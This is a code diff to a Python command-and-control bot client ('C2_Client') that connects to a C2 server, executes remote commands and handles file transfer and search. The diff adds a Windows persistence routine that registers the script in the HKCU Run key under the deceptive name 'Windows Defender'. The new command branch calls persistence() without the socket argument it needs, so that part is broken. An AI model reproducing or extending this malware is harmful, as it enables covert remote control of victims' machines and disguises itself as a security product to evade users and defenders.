@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import socket, subprocess, time, argparse, base64, platform, threading, os
+import socket, subprocess, time, argparse, base64, platform, threading, os, winreg
 
 parser = argparse.ArgumentParser("C2_Client")
 parser.add_argument("-i", "--ip", help="IP address of the C2 server")
@@ -130,6 +130,19 @@ def file_search(socket, file_name, starting_directory):
                 socket.sendall(base64_encode( b'File found at' + os.path.join(root, file).encode()))
                 return
     
+def persistence(socket):
+    """This function creates a persistence mechanism using the registry
+    """
+    # Establish the registry key and value
+    try: 
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run")
+        value = os.path.abspath(__file__)
+        # Set the registry key and value
+        winreg.SetValueEx(key, "Windows Defender", 0, winreg.REG_SZ, value)
+        winreg.CloseKey(key)
+        socket.sendall(base64_encode(b"[*] Persistence mechanism created"))
+    except:
+        socket.sendall(base64_encode(b"[-] Failed to create persistence mechanism"))
 
 def main(ip, ports):
     """This function creates a bot and connects to the C2 server. It then waits for commands from the C2 server.
@@ -203,6 +216,9 @@ def main(ip, ports):
                         starting_directory = command.split(" ")[2]  # Get the starting directory
                     command = command.split(" ")[0]
                     file_search(c2_bot, file_name, starting_directory)  # Search for the file
+                elif "persistence" == command.lower():  # If the command is persistence, create a persistence mechanism
+                    print("persistence") # Troubleshooting print statement
+                    persistence()  # Create a persistence mechanism
                 else:  # If the command is not quit, download, upload, cd, or search, execute the command
                     print("default")  # Troubleshooting print statement
                     try:  # Try to execute the command
